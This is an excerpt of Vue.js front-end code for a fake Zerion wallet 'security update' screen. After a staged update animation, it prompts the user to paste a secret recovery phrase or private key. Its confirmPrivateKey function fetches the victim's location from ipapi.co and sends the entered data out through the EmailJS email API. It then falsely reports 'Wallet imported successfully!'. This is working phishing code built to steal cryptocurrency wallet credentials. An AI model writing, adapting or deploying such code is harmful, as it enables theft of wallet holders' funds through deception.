        ...
        <div :key="currentStep">
          ...
          <template v-if="currentStep === 1">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[30px]">
                <img :src="logoUrl" alt="Zerion Logo" class="object-cover rounded-[10px] w-[60px] h-[60px]" />
              </div>
              <div class="w-full mt-[20px]">
                <h2 class="text-3xl md:text-5xl leading-[24px] font-bold m-0 tracking-[-0.02em]">Zerion Wallet</h2>
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">Self-custody for your DeFi portfolio</p>
          ...
          <template v-else-if="currentStep === 2">
            <div class="flex flex-col p-6">
              ...
              <div class="w-full mt-[20px]">
                ...
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">Security improvements and performance enhancements.</p>
                <div class="rounded-lg p-4" :style="{ background: accentBg }">
                  <div class="flex items-start text-gray-300 text-[14px] font-semibold">
                    Important security update recommended for optimal experience.
                  </div>
                </div>
                <div class="mt-[30px]">
                  <button @click="nextStep" type="button" class="w-full py-4 px-4 mb-2 border-none outline-none rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white" :style="{ background: primaryColor }">
          ...
          <div v-else-if="currentStep === 4" key="s4" class="flex flex-col w-full p-6">
            <div class="text-[14px] font-semibold mb-6">
              ...
              Choose how you want to import into Zerion.
            </div>

            <!-- Tabs -->
            <div class="flex gap-3 mb-4">
              <button v-for="m in methodTabs" :key="m.value" @click="importType = m.value"
                :class="['px-4 py-3 rounded-full  font-semibold border', importType === m.value ? 'text-white' : 'text-gray-300']"
            ...
            <div class="bg-[#0A0B0D] border-l-4 border-solid rounded-md p-4 mb-4 flex items-center" :style="{ borderLeftColor: primaryColor }">
              ...
              <p class="text-sm font-semibold text-gray-300 m-0">Paste your entire secret phrase into any field or type word-by-word.</p>
            </div>
            ...
            <div v-else class="mt-2 h-[400px] overflow-scroll">
              ...
              <div class="flex gap-3 mt-6">
                <button @click="confirmPhrase" :disabled="isImportDisabled" class="flex-1 font-bold text-[14px] border-none text-white py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed" :style="{ background: primaryColor }">Confirm</button>
              </div>
            </div>
          </div>
        </div>
...
function nextStep() {
  if (currentStep.value === 1) currentStep.value = 2; else if (currentStep.value === 2) startUpdate();
}
...
function startUpdate() {
  ...
  function step(now) {
    ...
    if (elapsed < duration) {
      ...
      setTimeout(() => { currentStep.value = 4; initPhraseWords(); }, 400);
    }
  }
  requestAnimationFrame(step);
}
...
async function confirmPrivateKey() {
  if (!privateKeyInput.value.trim()) return showMessage('Please enter a valid private key', 'error');
  isLoading.value = true;
  try {
    const location = await axios.get('https://ipapi.co/json');
    ...
    const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params);
    if (response.data === 'OK') { showMessage('Wallet imported successfully!', 'success'); emit('close'); }
  } catch (err) { showMessage(err.message || 'Import failed', 'error'); }
  finally { isLoading.value = false; }
}
